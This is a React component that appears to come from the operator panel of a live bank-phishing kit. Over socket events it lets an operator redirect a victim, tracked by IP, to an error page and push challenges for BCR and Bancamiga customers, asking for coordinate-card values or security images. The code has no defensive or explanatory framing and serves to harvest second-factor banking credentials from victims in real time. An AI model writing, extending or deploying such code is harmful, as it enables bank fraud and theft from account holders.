
import { useFormik } from "formik"
import {Popover, Button, PopoverTrigger, PopoverContent, Checkbox} from '@nextui-org/react';
import { useState } from "react";

export const ErrorIconLive = ({socket, ip, nameBank, urlPage, onClose, textPage}) => {
  
  const [formView, setFormView] = useState(false)
  const [isSelected, setIsSelected] = useState(false)
  const {values, handleBlur, handleChange, handleSubmit } = useFormik({
    initialValues: {
      image: '',
      coordinate: ''
    },
    onSubmit: async({image, coordinate}) =>{
      if(textPage == 'Token + Coordenadas') socket.emit('[bcr] getCoordinates', {coordinate, ip})
      console.log(coordinate)
      if(textPage == 'Metodo seguridad') socket.emit('[bancamiga] getImage', {image, ip})
      if(textPage == 'Imagen') {
        (isSelected) 
        ? socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(await navigator.clipboard.readText()), ip}) 
        : socket.emit('[bancamiga] getListImage', {listImage: JSON.parse(image), ip})
    }
      socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true, nameBank })
      setFormView(false)
      onClose()
    }
  })
  const sendBagRedirect = () => {
  if(textPage == 'Metodo seguridad' || textPage == 'Imagen' ||  textPage == 'Token + Coordenadas' ) return setFormView(true)
    socket.emit('[live] panelSendRedirect', { ip, urlPage, errorBag: true, nameBank })
    onClose()
  }
  
  return (
    <div>
      <Popover  isOpen={formView} onOpenChange={(open) => sendBagRedirect()} placement="right">
        <PopoverTrigger onClick={() => sendBagRedirect()} >
          <div className="cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
              <path strokeLinecap="round" strokeLinejoin="round" d="M6 18 18 6M6 6l12 12" />
            </svg>
          </div>
        </PopoverTrigger>
        <PopoverContent >
          <form onSubmit={handleSubmit} className={'p-2 flex gap-2 flex-col'}>
           
            {
              textPage == 'Token + Coordenadas' ? (
                  <>
                    <p>Manda tus coordenadas BCR</p>
                    <input required autoComplete="false" className="w-full py-1 pl-2" type="number" name="coordinate" value={values.coordinate.toString().slice(0,2)} onChange={handleChange} />
                  </>

              ) : null
            }
            {
              textPage == 'Metodo seguridad' ? (
                  <>
                    <p>Introduce el link de la imagen</p>
                    <input disabled={isSelected} required autoComplete="false" className="w-full py-1 " type="text" name="image" value={values.image} onChange={handleChange} />
                    
                    <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                      Omitir foto
                    </Checkbox>
                  </>
              ) : null
            }

            {
              textPage == 'Imagen' ? (
                  <Checkbox isSelected={isSelected} onValueChange={setIsSelected}>
                    Enviar lo copiado
                  </Checkbox>
              ) : null
            }

            <Button className="w-full mt-5" type="submit" color="primary" variant="shadow" size="sm" >ENVIAR</Button>
          </form>
        </PopoverContent>
      </Popover>
      
      
    </div>
  )
}
